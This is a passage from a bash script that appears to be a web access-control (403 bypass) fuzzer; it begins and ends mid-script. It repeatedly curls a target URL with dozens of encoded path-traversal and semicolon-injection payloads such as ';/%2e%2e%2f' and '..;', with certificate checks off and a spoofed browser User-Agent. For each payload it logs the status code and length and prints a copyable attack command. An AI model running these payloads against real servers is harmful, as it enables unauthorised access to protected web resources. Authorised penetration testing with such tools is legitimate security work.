	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/%2e%2e%2f%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/%%%%2e%%%%2e%%%%2f%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/%2e%2e%2f/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/%2e%2e%2f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/%%%%2e%%%%2e%%%%2f/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/%2e%2e/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/%2e%2e/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/%%%%2e%%%%2e/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/%2e. ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/%2e." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/%%%%2e.' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/%2f%2f../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/%2f%2f../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/%%%%2f%%%%2f../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/%2f/..%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/%2f/..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/%%%%2f/..%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/%2f/../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/%2f/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/%%%%2f/../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/.%2e ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/.%2e" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/.%%%%2e' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/.%2e/%2e%2e/%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/.%2e/%2e%2e/%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/.%%%%2e/%%%%2e%%%%2e/%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/.. ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/..' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/..%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/..%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/..%2f%2f../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..%2f%2f../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/..%%%%2f%%%%2f../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/..%2f..%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..%2f..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/..%%%%2f..%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/..%2f/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..%2f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/..%%%%2f/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/..%2f// ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..%2f//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/..%%%%2f//' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/../%2f/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/../%2f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/../%%%%2f/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/../../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/../../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/../../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/../..// ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/../..//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/../..//' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/.././../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/.././../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/.././../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/../.;/../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/../.;/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/../.;/../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/..// ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/..//' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/..//%2e%2e/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..//%2e%2e/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/..//%%%%2e%%%%2e/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/..//%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..//%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/..//%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/..//../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..//../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/..//../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/../// ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..///" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/..///' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/../;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/../;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/../;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/../;/../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/../;/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/../;/../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/..; ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/..;' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/.;. ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/.;." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/.;.' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;//%2f../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};//%2f../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};//%%%%2f../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;//.. ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};//.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};//..' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;//../../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};//../../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};//../../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;///.. ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};///.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};///..' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;///../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};///../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};///../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;///..// ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};///..//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};///..//' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;x ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};x" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};x' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;x/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};x/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};x/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;x; ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};x;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};x;' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ & ]: "
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}&" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}&' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ % ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %09 ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%09" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%09' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
